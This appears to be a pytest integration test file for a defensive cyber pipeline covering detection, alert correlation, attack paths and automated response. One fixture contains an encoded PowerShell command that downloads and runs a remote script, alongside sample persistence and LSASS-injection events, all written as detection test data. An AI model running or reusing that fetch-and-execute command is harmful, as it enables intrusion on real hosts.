"""
Integration tests for the Apex Cyber Sentinel defense pipeline.

Tests the full end-to-end cyber defense pipeline:
threat ingestion → anomaly detection → attack path mapping →
threat correlation → response generation → automated response →
adversarial co-evolution loop.

TDD: These tests define the expected API. They fail until the
cyber defense pipeline is implemented.
"""

import pytest
import json
import time
from unittest.mock import MagicMock, patch
from dataclasses import dataclass, field
from typing import List, Dict, Any, Optional, Tuple
from enum import Enum


# ---------------------------------------------------------------------------
# Test fixtures — sample threat data used across integration tests
# ---------------------------------------------------------------------------

@pytest.fixture
def sample_network_topology():
    """Sample network topology for attack path mapping tests."""
    return {
        "nodes": [
            {"id": "internet", "type": "external", "criticality": 0},
            {"id": "firewall", "type": "security_control", "criticality": 0.3},
            {"id": "dmz_web", "type": "server", "criticality": 0.5},
            {"id": "app_server", "type": "server", "criticality": 0.7},
            {"id": "db_server", "type": "database", "criticality": 0.9},
            {"id": "domain_controller", "type": "server", "criticality": 1.0},
            {"id": "workstation_1", "type": "workstation", "criticality": 0.4},
            {"id": "workstation_2", "type": "workstation", "criticality": 0.4},
        ],
        "edges": [
            {"source": "internet", "target": "firewall", "protocol": "tcp/443"},
            {"source": "firewall", "target": "dmz_web", "protocol": "tcp/80"},
            {"source": "dmz_web", "target": "app_server", "protocol": "tcp/8080"},
            {"source": "app_server", "target": "db_server", "protocol": "tcp/1433"},
            {"source": "app_server", "target": "domain_controller", "protocol": "tcp/389"},
            {"source": "workstation_1", "target": "app_server", "protocol": "tcp/445"},
            {"source": "workstation_2", "target": "domain_controller", "protocol": "tcp/389"},
            {"source": "firewall", "target": "workstation_1", "protocol": "tcp/22"},
        ],
    }


@pytest.fixture
def sample_threat_intel():
    """Sample threat intelligence feed data."""
    return {
        "indicators": [
            {
                "type": "ip",
                "value": "192.168.1.100",
                "confidence": 0.95,
                "severity": "critical",
                "first_seen": "2026-09-01T00:00:00Z",
                "last_seen": "2026-10-01T00:00:00Z",
                "tags": ["c2", "apt29", "ransomware"],
            },
            {
                "type": "domain",
                "value": "evil-c2.example.com",
                "confidence": 0.88,
                "severity": "high",
                "first_seen": "2026-09-10T00:00:00Z",
                "last_seen": "2026-10-01T00:00:00Z",
                "tags": ["c2", "phishing"],
            },
            {
                "type": "hash",
                "value": "a1b2c3d4e5f6789012345678901234567890abcd",
                "confidence": 0.99,
                "severity": "critical",
                "first_seen": "2026-08-15T00:00:00Z",
                "last_seen": "2026-10-01T00:00:00Z",
                "tags": ["malware", "trojan", "supply-chain"],
            },
        ],
        "feed_id": "feed-001",
        "timestamp": "2026-10-01T00:00:00Z",
    }


@pytest.fixture
def sample_behavioral_events():
    """Sample behavioral analytics events for zero-day detection."""
    return [
        {
            "event_id": "evt-001",
            "timestamp": "2026-10-01T10:00:00Z",
            "host": "workstation_1",
            "user": "jdoe",
            "process": "powershell.exe",
            "action": "execute",
            "command_line": "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=",
            "parent_process": "winword.exe",
            "network_connections": [{"dest": "192.168.1.100", "port": 443}],
        },
        {
            "event_id": "evt-002",
            "timestamp": "2026-10-01T10:00:05Z",
            "host": "workstation_1",
            "user": "jdoe",
            "process": "powershell.exe",
            "action": "network_connect",
            "dest_ip": "192.168.1.100",
            "dest_port": 443,
            "bytes_sent": 1024,
            "bytes_received": 2048,
        },
        {
            "event_id": "evt-003",
            "timestamp": "2026-10-01T10:00:10Z",
            "host": "workstation_1",
            "user": "jdoe",
            "process": "powershell.exe",
            "action": "file_write",
            "file_path": "C:\\Users\\jdoe\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.vbs",
            "file_size": 512,
        },
        {
            "event_id": "evt-004",
            "timestamp": "2026-10-01T10:00:15Z",
            "host": "workstation_1",
            "user": "jdoe",
            "process": "powershell.exe",
            "action": "registry_modify",
            "registry_key": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
            "registry_value": "UpdateService",
            "registry_data": "C:\\Users\\jdoe\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.vbs",
        },
        {
            "event_id": "evt-005",
            "timestamp": "2026-10-01T10:00:20Z",
            "host": "workstation_1",
            "user": "jdoe",
            "process": "powershell.exe",
            "action": "process_inject",
            "target_process": "lsass.exe",
            "injection_method": "CreateRemoteThread",
        },
    ]


@pytest.fixture
def sample_alerts():
    """Sample security alerts for correlation tests."""
    return [
        {
            "alert_id": "alert-001",
            "timestamp": "2026-10-01T10:00:00Z",
            "source": "ids",
            "severity": "high",
            "signature": "ET MALWARE Possible C2 Beacon",
            "src_ip": "192.168.1.50",
            "dest_ip": "192.168.1.100",
            "dest_port": 443,
            "host": "workstation_1",
        },
        {
            "alert_id": "alert-002",
            "timestamp": "2026-10-01T10:00:05Z",
            "source": "edr",
            "severity": "critical",
            "signature": "Suspicious PowerShell Execution",
            "host": "workstation_1",
            "user": "jdoe",
            "process": "powershell.exe",
        },
        {
            "alert_id": "alert-003",
            "timestamp": "2026-10-01T10:00:10Z",
            "source": "edr",
            "severity": "high",
            "signature": "Persistence Mechanism - Registry Run Key",
            "host": "workstation_1",
            "user": "jdoe",
        },
        {
            "alert_id": "alert-004",
            "timestamp": "2026-10-01T10:00:15Z",
            "source": "edr",
            "severity": "critical",
            "signature": "LSASS Process Injection",
            "host": "workstation_1",
            "user": "jdoe",
        },
    ]


# ---------------------------------------------------------------------------
# Integration Test 1: Full pipeline — threat ingestion to response
# ---------------------------------------------------------------------------

class TestFullPipeline:
    """End-to-end pipeline: ingest → detect → correlate → respond."""

    def test_pipeline_processes_threat_intel_end_to_end(self, sample_threat_intel):
        """Pipeline ingests threat intel and produces actionable output."""
        from cyber.pipeline import DefensePipeline

        pipeline = DefensePipeline()
        result = pipeline.process_threat_intel(sample_threat_intel)

        assert result is not None
        assert "indicators_ingested" in result
        assert result["indicators_ingested"] == 3
        assert "timestamp" in result

    def test_pipeline_detects_anomalies_from_events(self, sample_behavioral_events):
        """Pipeline detects anomalies from behavioral event stream."""
        from cyber.pipeline import DefensePipeline

        pipeline = DefensePipeline()
        result = pipeline.detect_anomalies(sample_behavioral_events)

        assert result is not None
        assert "anomalies_detected" in result
        assert result["anomalies_detected"] > 0
        assert "risk_score" in result
        assert 0 <= result["risk_score"] <= 1.0

    def test_pipeline_correlates_alerts_into_incidents(self, sample_alerts):
        """Pipeline correlates multiple alerts into a single incident."""
        from cyber.pipeline import DefensePipeline

        pipeline = DefensePipeline()
        result = pipeline.correlate_alerts(sample_alerts)

        assert result is not None
        assert "incidents" in result
        assert len(result["incidents"]) >= 1
        incident = result["incidents"][0]
        assert "incident_id" in incident
        assert "alerts" in incident
        assert len(incident["alerts"]) >= 2
        assert "severity" in incident

    def test_pipeline_generates_response_for_critical_incident(self, sample_alerts):
        """Pipeline generates automated response for critical incidents."""
        from cyber.pipeline import DefensePipeline

        pipeline = DefensePipeline()
        incidents = pipeline.correlate_alerts(sample_alerts)
        critical_incident = [i for i in incidents["incidents"] if i["severity"] == "critical"]
        assert len(critical_incident) > 0

        response = pipeline.generate_response(critical_incident[0])
        assert response is not None
        assert "actions" in response
        assert len(response["actions"]) > 0
        assert "priority" in response

    def test_pipeline_executes_response_actions(self, sample_alerts):
        """Pipeline executes response actions and tracks their status."""
        from cyber.pipeline import DefensePipeline

        pipeline = DefensePipeline()
        incidents = pipeline.correlate_alerts(sample_alerts)
        response = pipeline.generate_response(incidents["incidents"][0])

        execution_result = pipeline.execute_response(response)
        assert execution_result is not None
        assert "completed" in execution_result
        assert "failed" in execution_result
        assert execution_result["completed"] + execution_result["failed"] == len(response["actions"])

    def test_pipeline_full_cycle_from_detection_to_response(self, sample_threat_intel, sample_behavioral_events, sample_alerts):
        """Full cycle: ingest intel → detect anomalies → correlate → respond → execute."""
        from cyber.pipeline import DefensePipeline

        pipeline = DefensePipeline()

        # Step 1: Ingest threat intel
        intel_result = pipeline.process_threat_intel(sample_threat_intel)
        assert intel_result["indicators_ingested"] == 3

        # Step 2: Detect anomalies
        anomaly_result = pipeline.detect_anomalies(sample_behavioral_events)
        assert anomaly_result["anomalies_detected"] > 0

        # Step 3: Correlate alerts
        incident_result = pipeline.correlate_alerts(sample_alerts)
        assert len(incident_result["incidents"]) >= 1

        # Step 4: Generate response
        response = pipeline.generate_response(incident_result["incidents"][0])
        assert len(response["actions"]) > 0

        # Step 5: Execute response
        execution = pipeline.execute_response(response)
        assert execution["completed"] + execution["failed"] == len(response["actions"])


# ---------------------------------------------------------------------------
# Integration Test 2: Attack path mapping
# ---------------------------------------------------------------------------

class TestAttackPathMapping:
    """Graph-based attack path mapping and critical asset protection."""

    def test_attack_path_finds_route_to_critical_asset(self, sample_network_topology):
        """Finds attack path from external entry to critical domain controller."""
        from cyber.attack_path import AttackPathMapper

        mapper = AttackPathMapper(sample_network_topology)
        paths = mapper.find_paths(source="internet", target="domain_controller")

        assert paths is not None
        assert len(paths) > 0
        # Shortest path should be: internet → firewall → workstation_1 → ... → domain_controller
        shortest = min(paths, key=len)
        assert shortest[0] == "internet"
        assert shortest[-1] == "domain_controller"

    def test_attack_path_ranks_by_criticality(self, sample_network_topology):
        """Attack paths are ranked by the criticality of assets they traverse."""
        from cyber.attack_path import AttackPathMapper

        mapper = AttackPathMapper(sample_network_topology)
        paths = mapper.find_paths(source="internet", target="domain_controller")

        # All paths should reach the domain controller (criticality 1.0)
        for path in paths:
            assert "domain_controller" in path

    def test_attack_path_identifies_critical_nodes(self, sample_network_topology):
        """Identifies critical nodes that appear in multiple attack paths."""
        from cyber.attack_path import AttackPathMapper

        mapper = AttackPathMapper(sample_network_topology)
        critical_nodes = mapper.identify_critical_nodes()

        assert critical_nodes is not None
        assert len(critical_nodes) > 0
        # Domain controller should be identified as critical
        node_ids = [n["id"] for n in critical_nodes]
        assert "domain_controller" in node_ids

    def test_attack_path_calculates_blast_radius(self, sample_network_topology):
        """Calculates blast radius if a given node is compromised."""
        from cyber.attack_path import AttackPathMapper

        mapper = AttackPathMapper(sample_network_topology)
        blast_radius = mapper.calculate_blast_radius("workstation_1")

        assert blast_radius is not None
        assert "reachable_nodes" in blast_radius
        assert "critical_assets_at_risk" in blast_radius
        assert "workstation_1" in blast_radius["reachable_nodes"]
        # Domain controller should be at risk from workstation_1
        assert "domain_controller" in blast_radius["critical_assets_at_risk"]


# ---------------------------------------------------------------------------
# Integration Test 3: Zero-day detection
# ---------------------------------------------------------------------------

class TestZeroDayDetection:
    """Behavioral analytics for zero-day threat detection."""

    def test_zero_day_detects_suspicious_powershell(self, sample_behavioral_events):
        """Detects encoded PowerShell execution as anomalous behavior."""
        from cyber.zero_day import ZeroDayDetector

        detector = ZeroDayDetector()
        result = detector.analyze(sample_behavioral_events)

        assert result is not None
        assert "threats_detected" in result
        assert result["threats_detected"] > 0
        assert "confidence" in result
        assert result["confidence"] > 0.5

    def test_zero_day_detects_persistence_mechanism(self, sample_behavioral_events):
        """Detects registry run key persistence."""
        from cyber.zero_day import ZeroDayDetector

        detector = ZeroDayDetector()
        result = detector.analyze(sample_behavioral_events)

        # Should detect the registry modification event
        threats = result.get("threats", [])
        persistence_threats = [t for t in threats if "persistence" in t.get("type", "").lower()]
        assert len(persistence_threats) > 0

    def test_zero_day_detects_process_injection(self, sample_behavioral_events):
        """Detects LSASS process injection as critical threat."""
        from cyber.zero_day import ZeroDayDetector

        detector = ZeroDayDetector()
        result = detector.analyze(sample_behavioral_events)

        threats = result.get("threats", [])
        injection_threats = [t for t in threats if "injection" in t.get("type", "").lower()]
        assert len(injection_threats) > 0
        assert injection_threats[0]["severity"] == "critical"

    def test_zero_day_benign_events_produce_no_threats(self):
        """Benign behavioral events produce no threat detections."""
        from cyber.zero_day import ZeroDayDetector

        benign_events = [
            {
                "event_id": "benign-001",
                "timestamp": "2026-10-01T09:00:00Z",
                "host": "workstation_1",
                "user": "jdoe",
                "process": "chrome.exe",
                "action": "network_connect",
                "dest_ip": "142.250.80.46",
                "dest_port": 443,
            },
            {
                "event_id": "benign-002",
                "timestamp": "2026-10-01T09:00:05Z",
                "host": "workstation_1",
                "user": "jdoe",
                "process": "outlook.exe",
                "action": "file_read",
                "file_path": "C:\\Users\\jdoe\\Documents\\report.docx",
            },
        ]

        detector = ZeroDayDetector()
        result = detector.analyze(benign_events)

        assert result is not None
        assert result["threats_detected"] == 0


# ---------------------------------------------------------------------------
# Integration Test 4: Adversarial co-evolution
# ---------------------------------------------------------------------------

class TestAdversarialCoEvolution:
    """Red/blue team co-evolution loop."""

    def test_red_team_generates_attack_scenario(self):
        """Red team generates a realistic attack scenario."""
        from cyber.co_evolution import RedTeam

        red = RedTeam()
        scenario = red.generate_scenario()

        assert scenario is not None
        assert "attack_type" in scenario
        assert "target" in scenario
        assert "steps" in scenario
        assert len(scenario["steps"]) > 0

    def test_blue_team_generates_defense(self):
        """Blue team generates defense for a given attack scenario."""
        from cyber.co_evolution import BlueTeam

        blue = BlueTeam()
        attack_scenario = {
            "attack_type": "phishing",
            "target": "workstation_1",
            "steps": ["initial_access", "execution", "persistence"],
        }
        defense = blue.generate_defense(attack_scenario)

        assert defense is not None
        assert "defense_actions" in defense
        assert len(defense["defense_actions"]) > 0
        assert "coverage_score" in defense
        assert 0 <= defense["coverage_score"] <= 1.0

    def test_co_evolution_loop_improves_defense(self):
        """Co-evolution loop iteratively improves defense coverage."""
        from cyber.co_evolution import CoEvolutionEngine

        engine = CoEvolutionEngine()
        initial_coverage = engine.get_defense_coverage()

        # Run one co-evolution cycle
        engine.run_cycle()

        new_coverage = engine.get_defense_coverage()
        assert new_coverage >= initial_coverage

    def test_co_evolution_produces_purple_team_report(self):
        """Co-evolution produces a purple team report with gaps and recommendations."""
        from cyber.co_evolution import CoEvolutionEngine

        engine = CoEvolutionEngine()
        engine.run_cycle()
        report = engine.generate_purple_team_report()

        assert report is not None
        assert "attack_coverage" in report
        assert "defense_gaps" in report
        assert "recommendations" in report
        assert len(report["recommendations"]) > 0


# ---------------------------------------------------------------------------
# Integration Test 5: Threat correlation engine
# ---------------------------------------------------------------------------

class TestThreatCorrelation:
    """Multi-source threat correlation and incident construction."""

    def test_correlation_groups_related_alerts(self, sample_alerts):
        """Groups alerts from the same host/timeframe into one incident."""
        from cyber.correlation import ThreatCorrelator

        correlator = ThreatCorrelator()
        incidents = correlator.correlate(sample_alerts)

        assert incidents is not None
        assert len(incidents) >= 1
        # All sample alerts are from workstation_1 within 15 seconds
        # Should be grouped into at least one incident
        all_alert_ids = set()
        for incident in incidents:
            for alert in incident["alerts"]:
                all_alert_ids.add(alert["alert_id"])
        assert len(all_alert_ids) == len(sample_alerts)

    def test_correlation_enriches_with_threat_intel(self, sample_alerts, sample_threat_intel):
        """Correlated incidents are enriched with threat intelligence."""
        from cyber.correlation import ThreatCorrelator

        correlator = ThreatCorrelator()
        correlator.load_threat_intel(sample_threat_intel)
        incidents = correlator.correlate(sample_alerts)

        assert incidents is not None
        # At least one incident should have IOC matches
        has_ioc_match = any(
            incident.get("ioc_matches") for incident in incidents
        )
        assert has_ioc_match

    def test_correlation_assigns_severity_based_on_alerts(self, sample_alerts):
        """Incident severity is derived from the highest-severity alert."""
        from cyber.correlation import ThreatCorrelator

        correlator = ThreatCorrelator()
        incidents = correlator.correlate(sample_alerts)

        assert incidents is not None
        for incident in incidents:
            alert_severities = [a["severity"] for a in incident["alerts"]]
            if "critical" in alert_severities:
                assert incident["severity"] == "critical"


# ---------------------------------------------------------------------------
# Integration Test 6: Sandbox analysis
# ---------------------------------------------------------------------------

class TestSandboxAnalysis:
    """Dynamic sandbox analysis for unknown files."""

    def test_sandbox_detects_malicious_behavior(self):
        """Sandbox detects malicious behavior in an unknown binary."""
        from cyber.sandbox import SandboxAnalyzer

        sandbox = SandboxAnalyzer()
        # Simulate a malicious file hash
        result = sandbox.analyze_file(
            file_hash="a1b2c3d4e5f6789012345678901234567890abcd",
            file_type="pe_executable",
        )

        assert result is not None
        assert "verdict" in result
        assert result["verdict"] in ("malicious", "suspicious", "benign")
        assert "behaviors_observed" in result
        assert len(result["behaviors_observed"]) > 0

    def test_sandbox_detects_network_communication(self):
        """Sandbox detects C2 network communication."""
        from cyber.sandbox import SandboxAnalyzer

        sandbox = SandboxAnalyzer()
        result = sandbox.analyze_file(
            file_hash="a1b2c3d4e5f6789012345678901234567890abcd",
            file_type="pe_executable",
        )

        network_behaviors = [
            b for b in result["behaviors_observed"]
            if b.get("category") == "network"
        ]
        assert len(network_behaviors) > 0

    def test_sandbox_detects_file_system_manipulation(self):
        """Sandbox detects file system manipulation (dropping payloads)."""
        from cyber.sandbox import SandboxAnalyzer

        sandbox = SandboxAnalyzer()
        result = sandbox.analyze_file(
            file_hash="a1b2c3d4e5f6789012345678901234567890abcd",
            file_type="pe_executable",
        )

        fs_behaviors = [
            b for b in result["behaviors_observed"]
            if b.get("category") == "filesystem"
        ]
        assert len(fs_behaviors) > 0


# ---------------------------------------------------------------------------
# Integration Test 7: Automated response system
# ---------------------------------------------------------------------------

class TestAutomatedResponse:
    """Automated incident response and containment."""

    def test_response_isolates_compromised_host(self, sample_alerts):
        """Response system isolates a compromised host."""
        from cyber.response import ResponseEngine

        engine = ResponseEngine()
        incident = {
            "incident_id": "inc-001",
            "severity": "critical",
            "host": "workstation_1",
            "alerts": sample_alerts,
        }
        response = engine.respond(incident)

        assert response is not None
        assert "actions" in response
        action_types = [a["type"] for a in response["actions"]]
        assert "isolate_host" in action_types

    def test_response_blocks_c2_communication(self, sample_alerts, sample_threat_intel):
        """Response system blocks known C2 IP addresses."""
        from cyber.response import ResponseEngine

        engine = ResponseEngine()
        engine.load_threat_intel(sample_threat_intel)
        incident = {
            "incident_id": "inc-001",
            "severity": "critical",
            "host": "workstation_1",
            "alerts": sample_alerts,
        }
        response = engine.respond(incident)

        assert response is not None
        action_types = [a["type"] for a in response["actions"]]
        assert "block_ip" in action_types

    def test_response_creates_forensic_snapshot(self, sample_alerts):
        """Response system creates forensic snapshot of compromised host."""
        from cyber.response import ResponseEngine

        engine = ResponseEngine()
        incident = {
            "incident_id": "inc-001",
            "severity": "critical",
            "host": "workstation_1",
            "alerts": sample_alerts,
        }
        response = engine.respond(incident)

        assert response is not None
        action_types = [a["type"] for a in response["actions"]]
        assert "forensic_snapshot" in action_types


# ---------------------------------------------------------------------------
# Integration Test 8: Purple team validation
# ---------------------------------------------------------------------------

class TestPurpleTeam:
    """Purple team validation of detection and response capabilities."""

    def test_purple_team_validates_detection_coverage(self):
        """Purple team validates that attack techniques are detected."""
        from cyber.purple_team import PurpleTeamValidator

        validator = PurpleTeamValidator()
        attack_techniques = [
            "initial_access",
            "execution",
            "persistence",
            "privilege_escalation",
            "defense_evasion",
            "credential_access",
            "discovery",
            "lateral_movement",
            "collection",
            "exfiltration",
            "command_and_control",
            "impact",
        ]
        result = validator.validate_detection(attack_techniques)

        assert result is not None
        assert "coverage_percentage" in result
        assert "detected" in result
        assert "missed" in result
        assert len(result["detected"]) + len(result["missed"]) == len(attack_techniques)

    def test_purple_team_validates_response_effectiveness(self):
        """Purple team validates that responses contain the attack."""
        from cyber.purple_team import PurpleTeamValidator

        validator = PurpleTeamValidator()
        attack_scenario = {
            "attack_type": "ransomware",
            "steps": ["initial_access", "execution", "encryption"],
        }
        response_actions = [
            {"type": "isolate_host"},
            {"type": "block_ip"},
            {"type": "forensic_snapshot"},
        ]
        result = validator.validate_response(attack_scenario, response_actions)

        assert result is not None
        assert "effective" in result
        assert "gaps" in result


# ---------------------------------------------------------------------------
# Integration Test 9: Behavioral grammar
# ---------------------------------------------------------------------------

class TestBehavioralGrammar:
    """Behavioral grammar for attack pattern recognition."""

    def test_grammar_parses_attack_chain(self, sample_behavioral_events):
        """Parses a sequence of events into a recognized attack chain."""
        from cyber.behavioral_grammar import BehavioralGrammar

        grammar = BehavioralGrammar()
        chain = grammar.parse(sample_behavioral_events)

        assert chain is not None
        assert "pattern" in chain
        assert chain["pattern"] is not None
        assert "confidence" in chain
        assert chain["confidence"] > 0.5

    def test_grammar_identifies_kill_chain_phase(self, sample_behavioral_events):
        """Identifies which cyber kill chain phase the events represent."""
        from cyber.behavioral_grammar import BehavioralGrammar

        grammar = BehavioralGrammar()
        chain = grammar.parse(sample_behavioral_events)

        assert "kill_chain_phases" in chain
        phases = chain["kill_chain_phases"]
        assert len(phases) > 0
        # These events should cover execution, persistence, and C2
        assert "execution" in phases
        assert "persistence" in phases
        assert "command_and_control" in phases


# ---------------------------------------------------------------------------
# Integration Test 10: Critical asset protection
# ---------------------------------------------------------------------------

class TestCriticalAssetProtection:
    """Protection mechanisms for critical assets."""

    def test_critical_assets_identified(self, sample_network_topology):
        """System identifies critical assets in the network."""
        from cyber.asset_protection import AssetProtector

        protector = AssetProtector(sample_network_topology)
        critical = protector.identify_critical_assets()

        assert critical is not None
        assert len(critical) > 0
        # Domain controller has criticality 1.0
        dc = [a for a in critical if a["id"] == "domain_controller"]
        assert len(dc) == 1
        assert dc[0]["criticality"] == 1.0

    def test_critical_assets_have_enhanced_monitoring(self, sample_network_topology):
        """Critical assets receive enhanced monitoring configuration."""
        from cyber.asset_protection import AssetProtector

        protector = AssetProtector(sample_network_topology)
        config = protector.get_monitoring_config("domain_controller")

        assert config is not None
        assert "enhanced" in config
        assert config["enhanced"] is True
        assert "alert_threshold" in config

    def test_critical_asset_compromise_triggers_escalation(self, sample_network_topology):
        """Compromise of a critical asset triggers immediate escalation."""
        from cyber.asset_protection import AssetProtector

        protector = AssetProtector(sample_network_topology)
        alert = {
            "asset_id": "domain_controller",
            "severity": "high",
            "type": "anomaly",
        }
        result = protector.evaluate_alert(alert)

        assert result is not None
        assert "escalate" in result
        assert result["escalate"] is True
        assert "priority" in result
        assert result["priority"] == "critical"


# ---------------------------------------------------------------------------
# Integration Test 11: Machine-speed response
# ---------------------------------------------------------------------------

class TestMachineSpeedResponse:
    """Response time requirements for automated defense."""

    def test_response_time_under_one_second(self, sample_alerts):
        """Automated response completes within 1 second."""
        from cyber.pipeline import DefensePipeline

        pipeline = DefensePipeline()
        incidents = pipeline.correlate_alerts(sample_alerts)

        start = time.time()
        response = pipeline.generate_response(incidents["incidents"][0])
        execution = pipeline.execute_response(response)
        elapsed = time.time() - start

        assert elapsed < 1.0, f"Response took {elapsed:.3f}s, must be < 1.0s"

    def test_pipeline_throughput_minimum(self, sample_behavioral_events):
        """Pipeline processes at least 100 events per second."""
        from cyber.pipeline import DefensePipeline

        pipeline = DefensePipeline()
        start = time.time()
        result = pipeline.detect_anomalies(sample_behavioral_events)
        elapsed = time.time() - start

        events_per_second = len(sample_behavioral_events) / max(elapsed, 0.001)
        assert events_per_second >= 100


# ---------------------------------------------------------------------------
# Integration Test 12: Full defense loop with co-evolution
# ---------------------------------------------------------------------------

class TestFullDefenseLoop:
    """Complete defense loop integrating all components."""

    def test_full_defense_loop_integrates_all_components(
        self, sample_network_topology, sample_threat_intel,
        sample_behavioral_events, sample_alerts
    ):
        """Full defense loop: all components work together end-to-end."""
        from cyber.pipeline import DefensePipeline
        from cyber.co_evolution import CoEvolutionEngine

        # Initialize pipeline
        pipeline = DefensePipeline()
        pipeline.load_network_topology(sample_network_topology)

        # Step 1: Ingest threat intel
        intel_result = pipeline.process_threat_intel(sample_threat_intel)
        assert intel_result["indicators_ingested"] == 3

        # Step 2: Detect zero-day threats
        anomaly_result = pipeline.detect_anomalies(sample_behavioral_events)
        assert anomaly_result["anomalies_detected"] > 0

        # Step 3: Correlate alerts
        incident_result = pipeline.correlate_alerts(sample_alerts)
        assert len(incident_result["incidents"]) >= 1

        # Step 4: Map attack paths for the incident
        for incident in incident_result["incidents"]:
            if "host" in incident:
                paths = pipeline.map_attack_paths(
                    source="internet",
                    target=incident["host"],
                )
                assert paths is not None

        # Step 5: Generate and execute response
        response = pipeline.generate_response(incident_result["incidents"][0])
        execution = pipeline.execute_response(response)
        assert execution["completed"] + execution["failed"] == len(response["actions"])

        # Step 6: Run co-evolution to improve defenses
        engine = CoEvolutionEngine()
        engine.run_cycle()
        report = engine.generate_purple_team_report()
        assert "recommendations" in report

    def test_defense_loop_learns_from_incident(
        self, sample_network_topology, sample_threat_intel,
        sample_behavioral_events, sample_alerts
    ):
        """Defense loop learns from incidents and improves over time."""
        from cyber.pipeline import DefensePipeline
        from cyber.co_evolution import CoEvolutionEngine

        pipeline = DefensePipeline()
        engine = CoEvolutionEngine()

        # First incident
        intel_result = pipeline.process_threat_intel(sample_threat_intel)
        anomaly_result = pipeline.detect_anomalies(sample_behavioral_events)
        incident_result = pipeline.correlate_alerts(sample_alerts)
        response = pipeline.generate_response(incident_result["incidents"][0])
        pipeline.execute_response(response)

        # Run co-evolution
        engine.run_cycle()
        report1 = engine.generate_purple_team_report()
        coverage1 = report1["attack_coverage"]

        # Second cycle should maintain or improve coverage
        engine.run_cycle()
        report2 = engine.generate_purple_team_report()
        coverage2 = report2["attack_coverage"]

        assert coverage2 >= coverage1
